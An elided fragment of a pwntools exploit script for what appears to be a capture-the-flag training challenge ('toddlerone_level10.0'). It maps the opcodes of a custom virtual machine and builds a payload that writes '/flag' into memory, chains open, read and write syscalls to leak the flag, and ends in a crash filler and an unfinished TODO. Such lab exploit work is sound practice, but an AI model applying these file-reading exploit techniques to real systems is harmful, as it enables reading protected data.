...
context.arch='amd64'
reg = {'a': b'\x20' , 'b':b'\x01' , 'c':b'\x40', 'd':b'\x10', 's':b'\x04', 'i':b'\x08', 'f':b'\x02'}
ins = {'sys': b'\x10', 'imm' : b'\x20', 'stm' : b'\x04', 'jmp':b'\x01', 'cmp':b'\x40', 'add':b'\x80'}
...
#r = process('/challenge/toddlerone_level10.0')
r = process(['sudo','strace','/challenge/toddlerone_level10.0'])
## cmp a: arg1 b: arg2
# a > b : f=0x01^0x08 
# a < b : f=0x02^0x08
# a == b : 0x10
...
orw = int.to_bytes(0x10 ^ 0x04 ^ 0x20,1,'little')  ##  systable['read'] ^ systable['open'] ^ systable['write']
# open flag
payload += stm(0,ord('/')) # 3
...
payload = payload + orw + reg['s'] + ins['sys']   ## syscall of open read write 21
payload += imm('s',1)
...
payload += cmp('d','f') 
payload += imm('s',20)
payload += jmp('s',0x10) ## if syscount == 1 jmp
...
payload += cmp('d','f')
payload += imm('s',20)
payload += jmp('s',0x10) # jmp orw
payload += b'\x43'*10 ### crash

#TODO: change fd to 4 and open it
